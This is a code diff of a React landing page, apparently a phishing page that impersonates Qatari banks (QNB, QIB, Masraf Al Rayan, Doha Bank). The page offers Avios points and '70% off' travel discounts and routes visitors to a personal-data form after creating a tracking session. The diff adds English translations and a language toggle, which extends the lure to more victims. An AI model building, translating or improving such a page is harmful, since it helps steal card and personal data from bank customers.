@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { nanoid } from "nanoid";
 import { trpc } from "@/lib/trpc";
+import { useLanguage } from "@/contexts/LanguageContext";
 
 const bankImages = {
   all: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
@@ -26,10 +27,16 @@ const cards = [
 
 export default function Home() {
   const [, setLocation] = useLocation();
+  const { language, setLanguage } = useLanguage();
   const [bankSelect, setBankSelect] = useState("all");
   const [mainCardImage, setMainCardImage] = useState(bankImages.all);
   const [currentSlide, setCurrentSlide] = useState(0);
   const createSessionMutation = trpc.submissions.createSession.useMutation();
+
+  const isArabic = language === "ar";
+  const footerImage = isArabic 
+    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
+    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -56,10 +63,10 @@ export default function Home() {
         });
         setLocation(`/personal-data?bank=${bankSelect}&session=${sessionId}`);
       } catch (error) {
-        alert("حدث خطأ. يرجى المحاولة مرة أخرى.");
+        alert(isArabic ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again.");
       }
     } else {
-      alert("يرجى اختيار البنك أولاً");
+      alert(isArabic ? "يرجى اختيار البنك أولاً" : "Please select your bank first");
     }
   };
 
@@ -75,14 +82,18 @@ export default function Home() {
       });
       setLocation(`/personal-data?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      alert("حدث خطأ. يرجى المحاولة مرة أخرى.");
+      alert(isArabic ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again.");
     }
+  };
+
+  const toggleLanguage = () => {
+    setLanguage(isArabic ? "en" : "ar");
   };
 
   const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);
 
   return (
-    <html lang="ar" dir="rtl">
+    <html lang={language} dir={isArabic ? "rtl" : "ltr"}>
       <head>
         <meta charSet="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -129,9 +140,9 @@ export default function Home() {
             <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="logo" />
           </div>
           <div className="header-left">
-            <a href="index_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
-              English
-            </a>
+            <button onClick={toggleLanguage} className="lang-btn" style={{ textDecoration: "none" }}>
+              {isArabic ? "English" : "العربية"}
+            </button>
           </div>
         </header>
 
@@ -150,20 +161,20 @@ export default function Home() {
 
         <div className="dropdown-container">
           <select className="dropdown-select" value={bankSelect} onChange={(e) => updatePage(e.target.value)}>
-            <option value="all">اختر بنكك</option>
-            <option value="qnb">بنك قطر الوطني (QNB)</option>
-            <option value="qib">مصرف قطر الإسلامي (QIB)</option>
-            <option value="rayan">مصرف الريان</option>
-            <option value="doha">بنك الدوحة</option>
+            <option value="all">{isArabic ? "اختر بنكك" : "Select your bank"}</option>
+            <option value="qnb">{isArabic ? "بنك قطر الوطني (QNB)" : "Qatar National Bank (QNB)"}</option>
+            <option value="qib">{isArabic ? "مصرف قطر الإسلامي (QIB)" : "Qatar Islamic Bank (QIB)"}</option>
+            <option value="rayan">{isArabic ? "مصرف الريان" : "Masraf Al Rayan"}</option>
+            <option value="doha">{isArabic ? "بنك الدوحة" : "Doha Bank"}</option>
           </select>
         </div>
 
         <div className="card-content-wrapper">
           <img src={mainCardImage} className="card-image" alt="Card Image" />
-          <h2>أضف بطاقة الدفع لحسابك</h2>
-          <p>أضف بطاقات الدفع من نوع Visa و Mastercard لحساب عضويتك واجمع نقاط أفيوس.</p>
+          <h2>{isArabic ? "أضف بطاقة الدفع لحسابك" : "Add payment card to your account"}</h2>
+          <p>{isArabic ? "أضف بطاقات الدفع من نوع Visa و Mastercard لحساب عضويتك واجمع نقاط أفيوس." : "Add Visa and Mastercard payment cards to your membership account and collect Avios points."}</p>
           <button className="apply-btn-main" onClick={goToPersonalData}>
-            ابدأ الآن
+            {isArabic ? "ابدأ الآن" : "Start Now"}
           </button>
         </div>
 
@@ -174,35 +185,35 @@ export default function Home() {
               <img src={card.img} className="card-image-qnb" alt="Credit Card" />
               <div className="grid-container">
                 <div className="feature-box">
-                  <h4>تأجير السيارات</h4>
-                  <p>خصم 70%</p>
+                  <h4>{isArabic ? "تأجير السيارات" : "Car Rental"}</h4>
+                  <p>{isArabic ? "خصم 70%" : "70% Off"}</p>
                 </div>
                 <div className="feature-box">
-                  <h4>حجوزات الفنادق</h4>
-                  <p>خصم 70%</p>
+                  <h4>{isArabic ? "حجوزات الفنادق" : "Hotel Booking"}</h4>
+                  <p>{isArabic ? "خصم 70%" : "70% Off"}</p>
                 </div>
                 <div className="feature-box">
-                  <h4>تذاكر الطيران</h4>
-                  <p>خصم 70%</p>
+                  <h4>{isArabic ? "تذاكر الطيران" : "Flight Tickets"}</h4>
+                  <p>{isArabic ? "خصم 70%" : "70% Off"}</p>
                 </div>
                 <div className="feature-box">
-                  <h4>المواقف</h4>
-                  <p>خصم 70%</p>
+                  <h4>{isArabic ? "المواقف" : "Parking"}</h4>
+                  <p>{isArabic ? "خصم 70%" : "70% Off"}</p>
                 </div>
               </div>
               <div className="bottom-features">
-                <div>مزايا حصرية</div>
-                <div>دفع آمن</div>
-                <div>تقبل عالمياً</div>
+                <div>{isArabic ? "مزايا حصرية" : "Exclusive Benefits"}</div>
+                <div>{isArabic ? "دفع آمن" : "Secure Pay"}</div>
+                <div>{isArabic ? "تقبل عالمياً" : "Global Acceptance"}</div>
               </div>
               <button className="apply-btn" onClick={() => handleCardClick(card.bank)}>
-                اطلبها الآن
+                {isArabic ? "اطلبها الآن" : "Apply Now"}
               </button>
             </div>
           ))}
         </div>
 
-        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
+        <img src={footerImage} className="footer-image" alt="Footer" />
       </body>
     </html>
   );
